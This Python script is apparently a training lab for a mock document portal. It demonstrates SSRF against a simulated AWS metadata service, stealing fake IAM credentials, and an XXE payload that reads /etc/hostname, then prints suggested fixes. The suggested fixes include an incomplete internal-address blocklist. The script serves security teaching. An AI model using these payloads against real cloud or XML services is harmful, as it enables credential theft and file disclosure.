#!/usr/bin/env python3
"""
SSRF + XXE audit — document processing portal.

Demonstrates:
  1. Normal use — confirm the URL fetcher works for a legitimate target
  2. SSRF (CWE-918) — aim the fetcher at the internal metadata endpoint
     to steal IAM credentials (Capital One breach pattern)
  3. XXE (CWE-611) — inject a DOCTYPE entity to read /etc/hostname
  4. Fix — what the server-side checks should look like

The "internal metadata service" (http://127.0.0.1:5001) runs in a
background thread — it simulates what 169.254.169.254 looks like from
a real EC2 instance.  In a live cloud environment the attacker's own IP
would get a 403 from the IMDS; only the instance itself (via the app)
can reach it.

> Only exploit systems you own or have explicit written authorisation to test.

Usage:
    python3 audit.py
"""
from __future__ import annotations

import json
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

sys.path.insert(0, "/lab/app")
from app import app as flask_app  # noqa: E402

flask_app.config["TESTING"] = True
DIVIDER = "─" * 64

# ── Mock cloud metadata service ───────────────────────────────────────────────
FAKE_CREDS = json.dumps({
    "Code":            "Success",
    "Type":            "AWS-HMAC",
    "AccessKeyId":     "ASIA3EXAMPLEXYZ12345",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "Token":           "IQoJb3JpZ2luX2VjEJr//////////wEaDmFwLXNvdXRoZWFzdC0x...",
    "Expiration":      "2024-03-15T12:00:00Z",
    "Note":            "These are simulated credentials — not real AWS keys",
}).encode()

METADATA_PORT = 5001


class MetadataHandler(BaseHTTPRequestHandler):
    """Simulates the AWS EC2 Instance Metadata Service (IMDSv1)."""

    def do_GET(self) -> None:
        if self.path == "/latest/meta-data/iam/security-credentials/":
            self._respond(200, "text/plain", b"webapp-ec2-role")
        elif "webapp-ec2-role" in self.path:
            self._respond(200, "application/json", FAKE_CREDS)
        elif self.path == "/latest/meta-data/instance-id":
            self._respond(200, "text/plain", b"i-0a1b2c3d4e5f67890")
        else:
            self._respond(404, "text/plain", b"404 Not Found")

    def _respond(self, code: int, ctype: str, body: bytes) -> None:
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args) -> None:
        pass  # suppress request logs during demo


def start_metadata_server() -> HTTPServer:
    server = HTTPServer(("127.0.0.1", METADATA_PORT), MetadataHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    time.sleep(0.05)  # let the server bind
    return server


# ── Demo ──────────────────────────────────────────────────────────────────────

def fmt(r) -> str:
    body = r.get_json()
    s = json.dumps(body)
    return f"HTTP {r.status_code}  {s[:140]}" if s else f"HTTP {r.status_code}"


def demo() -> int:
    server = start_metadata_server()
    METADATA_BASE = f"http://127.0.0.1:{METADATA_PORT}"

    print("=" * 64)
    print("SSRF + XXE Audit — document processing portal")
    print("OWASP A10/A05: CWE-918 (SSRF) + CWE-611 (XXE)")
    print("=" * 64)

    with flask_app.test_client() as c:

        # ── Step 1: Health check ─────────────────────────────────────────
        print("\n[Step 1] Confirm the portal is up")
        print()
        r = c.get("/health")
        print(f"  GET /health  →  {fmt(r)}")

        # ── Step 2: Normal SSRF fetch ────────────────────────────────────
        print(f"\n{DIVIDER}")
        print("[Step 2] Normal use — fetch a page from the server")
        print()
        r = c.get("/api/fetch?url=http://127.0.0.1:5001/latest/meta-data/instance-id")
        body = r.get_json()
        print(f"  GET /api/fetch?url=http://…/instance-id  →  HTTP {r.status_code}")
        print(f"  Body: {body.get('body', body)!r}")
        print()
        print("  So far this looks fine — the server fetches the URL and returns it.")
        print("  The bug is that the 'url' parameter is under attacker control.")

        # ── Step 3: SSRF → metadata credentials ─────────────────────────
        print(f"\n{DIVIDER}")
        print("[Step 3] SSRF — steal IAM credentials from the metadata endpoint")
        print()
        print("  In AWS, the metadata service is at 169.254.169.254 (link-local).")
        print("  Only the instance itself can reach it — not external callers.")
        print(f"  We simulate it at {METADATA_BASE} (internal only).")
        print()

        # Step 1: list roles
        roles_url = f"{METADATA_BASE}/latest/meta-data/iam/security-credentials/"
        r = c.get(f"/api/fetch?url={roles_url}")
        role = r.get_json().get("body", "").strip()
        print(f"  Payload 1: url={roles_url}")
        print(f"  → IAM role name: {role!r}")

        # Step 2: dump credentials
        creds_url = f"{METADATA_BASE}/latest/meta-data/iam/security-credentials/{role}"
        r = c.get(f"/api/fetch?url={creds_url}")
        creds = r.get_json().get("body", "")
        try:
            creds_json = json.loads(creds)
        except json.JSONDecodeError:
            creds_json = {"raw": creds}

        print(f"\n  Payload 2: url={creds_url}")
        print(f"  → Credentials:")
        for k, v in creds_json.items():
            print(f"      {k:<20} {v}")

        if creds_json.get("AccessKeyId"):
            print()
            print("  ✓ SSRF confirmed — server fetched internal credentials on our behalf")
            print("  The attacker now has short-lived AWS credentials for the EC2 role.")
            print("  Capital One breach (2019): exact same pattern → 100M+ records exposed.")

        # ── Step 4: XXE ──────────────────────────────────────────────────
        print(f"\n{DIVIDER}")
        print("[Step 4] XXE — inject an external entity to read /etc/hostname")
        print()
        xxe_payload = b"""<?xml version="1.0"?>
<!DOCTYPE invoice [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<invoice>
  <id>&xxe;</id>
  <amount>45000</amount>
</invoice>"""
        print("  Payload:")
        for line in xxe_payload.decode().splitlines():
            print(f"    {line}")
        print()
        r = c.post(
            "/api/import-invoice",
            data=xxe_payload,
            content_type="application/xml",
        )
        result = r.get_json()
        print(f"  HTTP {r.status_code}  {json.dumps(result)}")
        invoice_id = result.get("invoice_id", "")
        if invoice_id and invoice_id != "(none)" and len(invoice_id) < 80:
            print()
            print(f"  ✓ XXE confirmed — /etc/hostname contents injected into <id>:")
            print(f"    hostname: {invoice_id.strip()!r}")
            print()
            print("  With network=True, the entity could also reach internal HTTP services")
            print("  (SSRF-via-XXE). Real XXE chains file read → SSRF → exfil.")
        else:
            print(f"  (invoice_id={invoice_id!r} — see above)")

        # ── Step 5: Fix ──────────────────────────────────────────────────
        print(f"\n{DIVIDER}")
        print("[Step 5] Fix — what the server-side defences should be")
        print()
        print("  Bug 1 (SSRF) — add URL allow-list to /api/fetch:")
        print()
        print("    BLOCKED_RANGES = ['169.254.', '127.', '10.', '172.16.']")
        print("    host = urllib.parse.urlparse(url).hostname")
        print("    if any(host.startswith(r) for r in BLOCKED_RANGES):")
        print("        return jsonify({'error': 'Blocked: internal address'}), 403")
        print()
        print("  Bug 2 (XXE) — disable external entities in the XML parser:")
        print()
        print("    # Option A: defusedxml (safest)")
        print("    import defusedxml.ElementTree as ET")
        print("    tree = ET.fromstring(xml_data)   # external entities blocked by default")
        print()
        print("    # Option B: lxml with entities disabled")
        print("    parser = etree.XMLParser(")
        print("        resolve_entities=False,")
        print("        load_dtd=False,")
        print("        no_network=True,")
        print("    )")
        print()
        print("  General: treat every outbound request and every parser as a trust boundary.")
        print("  Validate inbound URLs; deny-by-default for XML parsers.")

    print(f"\n{'=' * 64}")
    print("Audit complete — SSRF + XXE demonstrated")
    print(f"{'=' * 64}\n")
    server.shutdown()
    return 0


if __name__ == "__main__":
    sys.exit(demo())
